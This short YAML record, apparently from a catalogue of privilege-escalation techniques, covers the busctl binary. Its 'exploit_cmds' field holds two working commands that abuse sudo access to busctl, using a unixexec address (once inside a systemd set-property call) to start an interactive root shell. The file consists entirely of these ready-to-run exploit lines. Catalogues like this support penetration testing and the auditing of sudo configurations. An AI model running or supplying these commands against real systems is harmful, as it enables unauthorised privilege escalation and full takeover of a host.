name: busctl
binary_path: /usr/bin/busctl
exploit_cmds:
- sudo /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1
  org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh
  -i 0<&2 1>&2'
- sudo /usr/bin/busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i
  0<&2 1>&2'
